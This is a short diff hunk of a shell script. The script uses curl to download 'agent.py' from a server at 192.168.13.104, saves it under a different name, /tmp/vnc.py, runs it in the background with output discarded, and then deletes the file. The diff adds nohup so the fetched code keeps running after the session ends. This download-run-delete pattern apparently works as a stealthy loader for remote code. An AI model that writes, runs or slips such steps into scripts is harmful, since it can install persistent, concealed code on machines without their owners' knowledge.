@@ -3,7 +3,7 @@
 curl -s -o /tmp/vnc.py http://192.168.13.104:8080/agent.py
 
 if [ -s /tmp/vnc.py ]; then
-    python3 /tmp/vnc.py > /dev/null 2>&1 &
+    nohup python3 /tmp/vnc.py > /dev/null 2>&1 &
 fi
 
 rm -f /tmp/vnc.py
